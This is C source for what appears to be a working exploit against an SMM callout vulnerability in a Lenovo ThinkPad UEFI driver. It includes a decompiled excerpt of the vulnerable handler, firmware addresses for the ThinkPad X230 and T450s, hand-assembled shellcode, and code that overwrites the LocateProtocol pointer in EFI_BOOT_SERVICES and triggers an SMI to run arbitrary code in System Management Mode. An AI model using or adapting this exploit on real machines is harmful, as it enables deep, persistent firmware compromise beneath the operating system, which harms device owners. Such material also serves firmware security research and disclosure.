#include "stdafx.h"

/*
    Lenovo ThinkPad SystemSmmAhciAspiLegacyRt UEFI driver SMM callout vulnarebility exploit.
    FFS file GUID of vulnerable driver: 124A2E7A-1949-483E-899F-6032904CA0A7

    Vulnerable handler code on ThinkPad T450s:

        EFI_STATUS __fastcall sub_3DC(__int64 a1, _QWORD *a2, __int64 a3, __int64 a4)
        {
          _QWORD *v4; // rbx@1
          __int64 v5; // rax@1
          unsigned __int16 v7; // [sp+30h] [bp-18h]@3
          int v8; // [sp+60h] [bp+18h]@5
          int v9; // [sp+68h] [bp+20h]@1

          v9 = 0;
          v4 = a2;

          //
          // Vulnerability is here:
          //
          // SMI handler code calls LocateProtocol() function which address is
          // stored in EFI_BOOT_SERVICES structure that accessbile for operating
          // system during runtime phase. Attacker can overwrite LocateProtocol()
          // address with shellcode address and get SMM code execution.
          //
          LODWORD(v5) = gBS->LocateProtocol(&stru_270, 0i64, &qword_BC0);
          if (v5 >= 0)
          {
            gEfiSmmCpuProtocol->ReadSaveState(gEfiSmmCpuProtocol, 2u, EFI_SMM_SAVE_STATE_REGISTER_ES, 0, &v9);
            gEfiSmmCpuProtocol->ReadSaveState(gEfiSmmCpuProtocol, 4u, EFI_SMM_SAVE_STATE_REGISTER_RBX, 0, &v7);
        
            if (*v4 == 0xFFFFFFFFi64)
            {
              // 
              // Another vulnerability is here: 
              // 
              // sub_93C() function accepts argument as a astructure with attacker controllable
              // address which allows to overwrite arbitray memory address wthin the SMRAM.
              // Cehck binary code of sub_93C() for more information.
              //
              sub_93C(v7);
            }
          }
          else
          {
            qword_BC0 = 0i64;
          }
      
          gEfiSmmCpuProtocol->ReadSaveState(gEfiSmmCpuProtocol, 4u, EFI_SMM_SAVE_STATE_REGISTER_RFLAGS, 0, &v8);
      
          v8 &= 0xFFFFFFFA;
          return gEfiSmmCpuProtocol->WriteSaveState(gEfiSmmCpuProtocol, 4u, EFI_SMM_SAVE_STATE_REGISTER_RFLAGS, 0, &v8);
        }
*/

typedef struct _UEFI_EXPL_TARGET
{
    /*
        Target address to overwrite (EFI_BOOT_SERVICES->LocateService field value)
        with shellcode address.
    */
    unsigned long long addr; 

    /*
        Number of vulnerable SMI handler.
    */
    unsigned char smi_num;

    /*
        Target name and description.
    */
    const char *name;

} UEFI_EXPL_TARGET,
*PUEFI_EXPL_TARGET;

/*
    List of model and firmware version specific constants for different targets.
*/
static UEFI_EXPL_TARGET g_targets[] =
{
    { 0xd12493b0, 0x01, "Lenovo ThinkPad X230"  },

    { 0xa11a6750, 0x03, "Lenovo ThinkPad T450s" }
};

// offsets of handler and context values in g_shellcode
#define SHELLCODE_OFFS_HANDLER 33
#define SHELLCODE_OFFS_CONTEXT 23

static unsigned char g_shellcode[] =
{
    /*
        Save registers
    */
    0x53,                                                           //  push     rbx
    0x51,                                                           //  push     rcx
    0x52,                                                           //  push     rdx
    0x56,                                                           //  push     rsi
    0x57,                                                           //  push     rdi
    0x41, 0x50,                                                     //  push     r8
    0x41, 0x51,                                                     //  push     r9
    0x41, 0x52,                                                     //  push     r10
    0x41, 0x53,                                                     //  push     r11
    0x41, 0x54,                                                     //  push     r12
    0x41, 0x55,                                                     //  push     r13
    0x41, 0x56,                                                     //  push     r14
    0x41, 0x57,                                                     //  push     r15

    /*
        Call smm_handler() function.
    */
    0x48, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     //  mov      rcx, smm_context
    0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     //  mov      rax, smm_handler
    0x48, 0x83, 0xec, 0x20,                                         //  sub      rsp, 0x20
    0xff, 0xd0,                                                     //  call     rax
    0x48, 0x83, 0xc4, 0x20,                                         //  add      rsp, 0x20

    /*
        Restore registers.
    */
    0x41, 0x5f,                                                     //  pop      r15
    0x41, 0x5e,                                                     //  pop      r14
    0x41, 0x5d,                                                     //  pop      r13
    0x41, 0x5c,                                                     //  pop      r12
    0x41, 0x5b,                                                     //  pop      r11
    0x41, 0x5a,                                                     //  pop      r10
    0x41, 0x59,                                                     //  pop      r9
    0x41, 0x58,                                                     //  pop      r8
    0x5f,                                                           //  pop      rdi
    0x5e,                                                           //  pop      rsi
    0x5a,                                                           //  pop      rdx
    0x59,                                                           //  pop      rcx
    0x5b,                                                           //  pop      rbx

    /*
        Shellcode must return -1 to bypass other functions calls inside
        sub_3DC() SMI handler to prevent fauls inside SMM.
    */
    0x48, 0x31, 0xc0,                                               //  xor      rax, rax
    0x48, 0xff, 0xc8,                                               //  dec      rax
    0xc3                                                            //  ret
};
//--------------------------------------------------------------------------------------
#pragma optimize("", off)

static void smm_handler(PUEFI_EXPL_SMM_SHELLCODE_CONTEXT context)
{
    // tell to the caller that smm_handler() was executed
    context->smi_count += 1;
   
    if (context->user_handler)
    {
        UEFI_EXPL_SMM_HANDLER user_handler = (UEFI_EXPL_SMM_HANDLER)context->user_handler;

        // call external handler
        user_handler((void *)context->user_context);
    }    

    return;
}

#pragma optimize("", on)
//--------------------------------------------------------------------------------------
void expl_lenovo_SystemSmmAhciAspiLegacyRt_targets_info(void)
{
    printf("Available targets:\n");

    for (int i = 0; i < sizeof(g_targets) / sizeof(UEFI_EXPL_TARGET); i++)
    {
        // get target model information
        UEFI_EXPL_TARGET *target = &g_targets[i];

        printf(" %d: %s\n", i, target->name);
    }
}
//--------------------------------------------------------------------------------------
bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, UEFI_EXPL_SMM_HANDLER handler, void *context)
{
    bool ret = false;
    UEFI_EXPL_TARGET *expl_target = NULL;
    UEFI_EXPL_SMM_SHELLCODE_CONTEXT smm_context;    

    smm_context.smi_count = 0;
    smm_context.user_handler = smm_context.user_context = 0;

    if (target < 0 || target >= sizeof(g_targets) / sizeof(UEFI_EXPL_TARGET))
    {
        printf(__FUNCTION__"() ERROR: Invalid target number %d\n", target);
        return false;
    }

    // get target model information
    expl_target = &g_targets[target];

    printf(__FUNCTION__"(): Using target \"%s\"\n", expl_target->name);

    if (handler)
    {
        unsigned long long addr = (unsigned long long)handler;

        // call caller specified handler from SMM
        if (!uefi_expl_phys_addr(addr, &smm_context.user_handler))
        {
            printf(__FUNCTION__"() ERROR: uefi_expl_phys_addr() fails\n");
            return false;
        }

        smm_context.user_context = (unsigned long long)context;
    }

    unsigned long long handler_addr = (unsigned long long)&smm_handler, handler_phys_addr = 0;   
    unsigned long long context_addr = (unsigned long long)&smm_context, context_phys_addr = 0;

    // get physical address of smm_handler()
    if (!uefi_expl_phys_addr(handler_addr, &handler_phys_addr))
    {
        printf(__FUNCTION__"() ERROR: uefi_expl_phys_addr() fails\n");
        return false;
    }    

    // get physical address of smm_context
    if (!uefi_expl_phys_addr(context_addr, &context_phys_addr))
    {
        printf(__FUNCTION__"() ERROR: uefi_expl_phys_addr() fails\n");
        return false;
    }

    printf(
        __FUNCTION__"(): SMM payload handler address is 0x%llx with context at 0x%llx\n", 
        handler_phys_addr, context_phys_addr
    );

    unsigned long long sc_addr = 0, sc_phys_addr = 0;       
    
    // allocate memory for shellcode
    if (uefi_expl_mem_alloc(PAGE_SIZE, &sc_addr, &sc_phys_addr))
    {        
        unsigned char shellcode[sizeof(g_shellcode)];

        memcpy(shellcode, g_shellcode, sizeof(g_shellcode));
        *(unsigned long long *)&shellcode[SHELLCODE_OFFS_HANDLER] = handler_phys_addr;
        *(unsigned long long *)&shellcode[SHELLCODE_OFFS_CONTEXT] = context_phys_addr;

        printf(__FUNCTION__"(): Physical memory for shellcode allocated at 0x%llx\n", sc_phys_addr);
        
        if (uefi_expl_phys_mem_write(sc_phys_addr, sizeof(shellcode), shellcode))
        {
            unsigned long long ptr_val = 0;

            // read original pointer value
            if (uefi_expl_phys_mem_read(expl_target->addr, sizeof(ptr_val), (unsigned char *)&ptr_val))
            {
                printf(__FUNCTION__"(): Old pointer 0x%llx value is 0x%llx\n", expl_target->addr, ptr_val);

                // overwrite pointer value
                if (uefi_expl_phys_mem_write(expl_target->addr, sizeof(sc_phys_addr), (unsigned char *)&sc_phys_addr))
                {
                    printf(__FUNCTION__"(): Generating SMI %d...\n", expl_target->smi_num);

                    if (!uefi_expl_smi_invoke(expl_target->smi_num))
                    {
                        printf(__FUNCTION__"() ERROR: uefi_expl_smi_invoke() fails\n");
                    }

                    if (smm_context.smi_count > 0)
                    {
                        ret = true;
                    }
                    
                    printf(__FUNCTION__"(): %s\n", ret ? "SUCCESS" : "FAILS");                    

                    // restore overwritten value
                    uefi_expl_phys_mem_write(expl_target->addr, sizeof(ptr_val), (unsigned char *)&ptr_val);
                }
                else
                {
                    printf(__FUNCTION__"() ERROR: uefi_expl_phys_mem_write() fails\n");
                }
            }
            else
            {
                printf(__FUNCTION__"() ERROR: uefi_expl_phys_mem_read() fails\n");
            }
        }
        else
        {
            printf(__FUNCTION__"() ERROR: uefi_expl_phys_mem_write() fails\n");
        }        

        // free memory
        uefi_expl_mem_free(sc_addr);
    }
    else
    {
        printf(__FUNCTION__"() ERROR: uefi_expl_mem_alloc() fails\n");
    }    

    return ret;
}
//--------------------------------------------------------------------------------------
// EoF
